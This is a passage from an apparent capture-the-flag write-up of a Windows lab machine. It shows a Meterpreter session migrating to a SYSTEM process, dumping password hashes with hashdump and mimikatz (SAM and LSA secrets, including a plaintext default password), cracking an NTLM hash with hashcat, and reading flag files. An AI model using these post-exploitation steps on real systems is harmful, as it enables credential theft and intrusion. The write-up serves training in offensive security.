...got system via technique <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Named Pipe Impersonation <span style="color:#f92672">(</span>In Memory/Admin<span style="color:#f92672">))</span>.
meterpreter &gt; ps                                                                                                                                              
                                                                                                                                                              
Process List                                                                                                                                                  
<span style="color:#f92672">============</span>                                                                                                                                                  
                                                                                                                                                              
 PID   PPID  Name                  Arch  Session  User                          Path                                                                          
 ---   ----  ----                  ----  -------  ----                          ----                                                                          
 <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#f92672">[</span>System Process<span style="color:#f92672">]</span>                                                                                                                                 
 <span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">0</span>     System                x64   <span style="color:#ae81ff">0</span>                                                                                                                    
 <span style="color:#ae81ff">416</span>   <span style="color:#ae81ff">4</span>     smss.exe              x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>mss.exe                                                  
 <span style="color:#ae81ff">428</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe                                               
 <span style="color:#ae81ff">560</span>   <span style="color:#ae81ff">564</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe                                               
 <span style="color:#ae81ff">564</span>   <span style="color:#ae81ff">556</span>   csrss.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe                                                 
 <span style="color:#ae81ff">612</span>   <span style="color:#ae81ff">556</span>   wininit.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>ininit.exe                                               
 <span style="color:#ae81ff">624</span>   <span style="color:#ae81ff">604</span>   csrss.exe             x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe                                                 
 <span style="color:#ae81ff">664</span>   <span style="color:#ae81ff">604</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe                                              
 <span style="color:#ae81ff">712</span>   <span style="color:#ae81ff">612</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe                                              
 <span style="color:#ae81ff">720</span>   <span style="color:#ae81ff">612</span>   lsass.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sass.exe                                                 
 <span style="color:#ae81ff">724</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe                                               
 <span style="color:#ae81ff">728</span>   <span style="color:#ae81ff">612</span>   lsm.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sm.exe                                                   
 <span style="color:#ae81ff">836</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe                                               
 <span style="color:#ae81ff">904</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">952</span>   <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1020</span>  <span style="color:#ae81ff">664</span>   LogonUI.exe           x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\L</span>ogonUI.exe
 <span style="color:#ae81ff">1128</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1184</span>  <span style="color:#ae81ff">1348</span>  cmd.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>md.exe
 <span style="color:#ae81ff">1204</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1348</span>  <span style="color:#ae81ff">712</span>   spoolsv.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>poolsv.exe
 <span style="color:#ae81ff">1384</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1448</span>  <span style="color:#ae81ff">712</span>   amazon-ssm-agent.exe  x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\S</span>SM<span style="color:#ae81ff">\a</span>mazon-ssm-agent.exe
 <span style="color:#ae81ff">1524</span>  <span style="color:#ae81ff">712</span>   LiteAgent.exe         x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\X</span>entools<span style="color:#ae81ff">\L</span>iteAgent.exe
 <span style="color:#ae81ff">1664</span>  <span style="color:#ae81ff">712</span>   Ec2Config.exe         x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\E</span>c2ConfigService<span style="color:#ae81ff">\E</span>c2Config.exe
 <span style="color:#ae81ff">1996</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">2084</span>  <span style="color:#ae81ff">712</span>   sppsvc.exe            x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ppsvc.exe
 <span style="color:#ae81ff">2240</span>  <span style="color:#ae81ff">2920</span>  powershell.exe        x86   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\W</span>indowsPowerShell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\p</span>owershell.exe
 <span style="color:#ae81ff">2368</span>  <span style="color:#ae81ff">2240</span>  cmd.exe               x86   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\c</span>md.exe
 <span style="color:#ae81ff">2396</span>  <span style="color:#ae81ff">564</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
 <span style="color:#ae81ff">2404</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">2556</span>  <span style="color:#ae81ff">564</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
 <span style="color:#ae81ff">2572</span>  <span style="color:#ae81ff">712</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">2604</span>  <span style="color:#ae81ff">712</span>   vds.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\v</span>ds.exe
 <span style="color:#ae81ff">2716</span>  <span style="color:#ae81ff">712</span>   SearchIndexer.exe     x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\S</span>earchIndexer.exe
 <span style="color:#ae81ff">2916</span>  <span style="color:#ae81ff">564</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
 <span style="color:#ae81ff">2920</span>  <span style="color:#ae81ff">2400</span>  powershell.exe        x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\W</span>indowsPowerShell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\p</span>owershell.exe
 <span style="color:#ae81ff">2996</span>  <span style="color:#ae81ff">2240</span>  cmd.exe               x86   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\c</span>md.exe
meterpreter &gt; migrate <span style="color:#ae81ff">712</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">2240</span> to 712...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
</code></pre></div><p>Yeah, migration was succesful, so we can dump the hashes of users passwords.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter &gt; load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 <span style="color:#ae81ff">20191125</span> <span style="color:#f92672">(</span>x64/windows<span style="color:#f92672">)</span>
 .## ^ <span style="color:#75715e">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
 <span style="color:#75715e">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span style="color:#75715e">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span style="color:#e6db74">&#39;## v ##&#39;</span>        Vincent LE TOUX            <span style="color:#f92672">(</span> vincent.letoux@gmail.com <span style="color:#f92672">)</span>
  <span style="color:#e6db74">&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter &gt; lsa_dump_sam 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping SAM
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7
Local SID : S-1-5-21-2633577515-2458672280-487782642

SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e

RID  : 000001f4 <span style="color:#f92672">(</span>500<span style="color:#f92672">)</span>
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 <span style="color:#f92672">(</span>501<span style="color:#f92672">)</span>
User : Guest

RID  : 000003e8 <span style="color:#f92672">(</span>1000<span style="color:#f92672">)</span>
User : Jon
  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d

meterpreter &gt; lsa_dump_secrets 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping LSA secrets
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7

Local name : Jon-PC <span style="color:#f92672">(</span> S-1-5-21-2633577515-2458672280-487782642 <span style="color:#f92672">)</span>
Domain name : WORKGROUP

Policy subsystem is : 1.11
LSA Key<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> : 1, default <span style="color:#f92672">{</span>888e8eec-afc6-d204-0da2-a847caf129ea<span style="color:#f92672">}</span>
  <span style="color:#f92672">[</span>00<span style="color:#f92672">]</span> <span style="color:#f92672">{</span>888e8eec-afc6-d204-0da2-a847caf129ea<span style="color:#f92672">}</span> c3c1bfae498011d6dd37f2710cc970a5e2d80f0e17e6c12237abaaceed8ce04f

Secret  : DefaultPassword
old/text: CDCClubROX

Secret  : DPAPI_SYSTEM
cur/hex : <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> dc <span style="color:#ae81ff">31</span> ac <span style="color:#ae81ff">35</span> e1 9a <span style="color:#ae81ff">18</span> b0 0b 5b <span style="color:#ae81ff">06</span> 6d e3 e8 da <span style="color:#ae81ff">89</span> 8b f8 da <span style="color:#ae81ff">71</span> fa ea <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">03</span> f4 2b <span style="color:#ae81ff">58</span> e1 a5 dd <span style="color:#ae81ff">35</span> ee <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">85</span> a9 <span style="color:#ae81ff">53</span> b1 c7 <span style="color:#ae81ff">95</span> 
    full: dc31ac35e19a18b00b5b066de3e8da898bf8da71faea7403f42b58e1a5dd35ee816185a953b1c795
    m/u : dc31ac35e19a18b00b5b066de3e8da898bf8da71 / faea7403f42b58e1a5dd35ee816185a953b1c795
old/hex : <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> c9 <span style="color:#ae81ff">22</span> d6 0b <span style="color:#ae81ff">83</span> 9e dd <span style="color:#ae81ff">98</span> a7 ad 7a 5a c5 ff 4e bb 8a d2 6f <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">61</span> be bf d4 bc <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">70</span> fd df <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">12</span> a8 c5 e5 2d <span style="color:#ae81ff">98</span> 6c <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">71</span> 
    full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971
    m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971

Secret  : NL$KM
cur/hex : <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">94</span> 4a <span style="color:#ae81ff">93</span> a2 9d d2 8e 2b cf 5f df <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">59</span> 4c e9 bc b8 <span style="color:#ae81ff">91</span> 2c <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">59</span> 1e bf <span style="color:#ae81ff">53</span> 1e <span style="color:#ae81ff">77</span> be c2 9b <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">04</span> b4 <span style="color:#ae81ff">56</span> ea 7d 6f ba c2 1b 7e f0 ba <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">67</span> e6 e6 <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">95</span> 1f <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">42</span> ee <span style="color:#ae81ff">34</span> 0a ee <span style="color:#ae81ff">99</span> 9f <span style="color:#ae81ff">55</span> 
</code></pre></div><p><strong>Within our elevated meterpreter shell, run the command &lsquo;hashdump&rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</strong></p>
<ul>
<li>Jon</li>
</ul>
<p>Now we can crack the hashes. It doesn&rsquo;t care if we use 
<a href="https://www.openwall.com/john/" target="_blank" rel="nofollow noreferrer noopener">john-the-ripper</a> or 
<a href="https://hashcat.net/hashcat/" target="_blank" rel="nofollow noreferrer noopener">hashcat</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#39;ffb43f0de35be4d9917ac0cc8ad57f8d&#39;</span> &gt; hashes.txt
$ hashcat -m <span style="color:#ae81ff">1000</span> -O hashes.txt /usr/local/share/wordlists/rockyou.txt
Dictionary cache hit:                                                                    
* Filename..: /usr/local/share/wordlists/rockyou.txt                                     
* Passwords.: <span style="color:#ae81ff">14344384</span>                                                                   
* Bytes.....: <span style="color:#ae81ff">139921497</span>                                                                                                                                                           
* Keyspace..: <span style="color:#ae81ff">14344384</span>                                                                                                                                                            
                                                                                                                                                                                  ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22                                                
                                                                                                                                                                                  
Session..........: hashcat                                                                                                                                                        
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
Time.Started.....: Fri Mar <span style="color:#ae81ff">20</span> 16:12:30 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> secs<span style="color:#f92672">)</span>
Time.Estimated...: Fri Mar <span style="color:#ae81ff">20</span> 16:12:33 <span style="color:#ae81ff">2020</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Guess.Base.......: File <span style="color:#f92672">(</span>/usr/local/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
Speed.#2.........:  3946.0 kH/s <span style="color:#f92672">(</span>7.80ms<span style="color:#f92672">)</span> @ Accel:64 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Salts
Progress.........: 10223616/14344384 <span style="color:#f92672">(</span>71.27%<span style="color:#f92672">)</span>
Rejected.........: 0/10223616 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Point....: 10027008/14344384 <span style="color:#f92672">(</span>69.90%<span style="color:#f92672">)</span>
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#2....: april669 -&gt; alisonodonnell1

Started: Fri Mar <span style="color:#ae81ff">20</span> 16:12:27 <span style="color:#ae81ff">2020</span>
Stopped: Fri Mar <span style="color:#ae81ff">20</span> 16:12:34 <span style="color:#ae81ff">2020</span>
</code></pre></div><p><strong>Copy this password hash to a file and research how to crack it. What is the cracked password?</strong></p>
<ul>
<li>alqfna22</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; cd C:/
meterpreter &gt; pwd
C:<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>meterpreter &gt; ls
Listing: C:<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span><span style="color:#f92672">============</span>

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   <span style="color:#ae81ff">0</span>        dir   2009-07-14 05:18:56 +0200  $Recycle.Bin
40777/rwxrwxrwx   <span style="color:#ae81ff">0</span>        dir   2009-07-14 07:08:56 +0200  Documents and Settings
40777/rwxrwxrwx   <span style="color:#ae81ff">0</span>        dir   2009-07-14 05:20:08 +0200  PerfLogs
40555/r-xr-xr-x   <span style="color:#ae81ff">4096</span>     dir   2009-07-14 05:20:08 +0200  Program Files
40555/r-xr-xr-x   <span style="color:#ae81ff">4096</span>     dir   2009-07-14 05:20:08 +0200  Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
40777/rwxrwxrwx   <span style="color:#ae81ff">4096</span>     dir   2009-07-14 05:20:08 +0200  ProgramData
40777/rwxrwxrwx   <span style="color:#ae81ff">0</span>        dir   2018-12-13 04:13:22 +0100  Recovery
40777/rwxrwxrwx   <span style="color:#ae81ff">4096</span>     dir   2018-12-13 00:01:17 +0100  System Volume Information
40555/r-xr-xr-x   <span style="color:#ae81ff">4096</span>     dir   2009-07-14 05:20:08 +0200  Users
40777/rwxrwxrwx   <span style="color:#ae81ff">16384</span>    dir   2009-07-14 05:20:08 +0200  Windows
100666/rw-rw-rw-  <span style="color:#ae81ff">24</span>       fil   2018-12-13 04:47:39 +0100  flag1.txt
0000/---------    <span style="color:#ae81ff">3089184</span>  fif   1970-02-07 00:26:08 +0100  hiberfil.sys
0000/---------    <span style="color:#ae81ff">3089184</span>  fif   1970-02-07 00:26:08 +0100  pagefile.sys

meterpreter &gt; cat flag1.txt 
flag<span style="color:#f92672">{</span>access_the_machine<span style="color:#f92672">}</span>
</code></pre></div><p><strong>Flag1? (Only submit the flag contents {CONTENTS})</strong></p>
<ul>
<li>access_the_machine</li>
</ul>
<p>For final steps, we return back to first session with basic command shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; 
Background session 2? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>                                                    
msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; 
msf5 post<span style="color:#f92672">(</span>multi/manage/shell_to_meterpreter<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">1</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...                                             

                                                                               
                                                                               

                                       
Name             : ConsoleHost                                                 
Version          : 2.0                                                         
InstanceId       : 6ab0de61-c602-4a6d-93f5-77a4f1f1c239
UI               : System.Management.Automation.Internal.Host.InternalHostUserI 
                   nterface                                                    
CurrentCulture   : en-US          
CurrentUICulture : en-US                                                       
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False             
Runspace         : System.Management.Automation.Runspaces.LocalRunspace



TJACJVXvCYTTfrcbvutJpyWlidgPcITh

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd C:<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>cd C:<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>
C:<span style="color:#ae81ff">\&gt;</span>dir flag* /s /p
dir flag* /s /p
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>
03/17/2019  02:27 PM                <span style="color:#ae81ff">24</span> flag1.txt
               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">24</span> bytes

 Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\R</span>ecent

03/17/2019  02:26 PM               <span style="color:#ae81ff">482</span> flag1.lnk
03/17/2019  02:30 PM               <span style="color:#ae81ff">848</span> flag2.lnk
03/17/2019  02:32 PM             2,344 flag3.lnk
               <span style="color:#ae81ff">3</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>          3,674 bytes

 Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments

03/17/2019  02:26 PM                <span style="color:#ae81ff">37</span> flag3.txt
               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">37</span> bytes

 Directory of C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig

03/17/2019  02:32 PM                <span style="color:#ae81ff">34</span> flag2.txt
               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>             <span style="color:#ae81ff">34</span> bytes

     Total Files Listed:
               <span style="color:#ae81ff">6</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>          3,769 bytes
               <span style="color:#ae81ff">0</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>  22,707,953,664 bytes free

C:<span style="color:#ae81ff">\&gt;</span>type C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\f</span>lag2.txt
type C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\f</span>lag2.txt
flag<span style="color:#f92672">{</span>sam_database_elevated_access<span style="color:#f92672">}</span>
C:<span style="color:#ae81ff">\&gt;</span>type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\f</span>lag3.txt
type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\f</span>lag3.txt
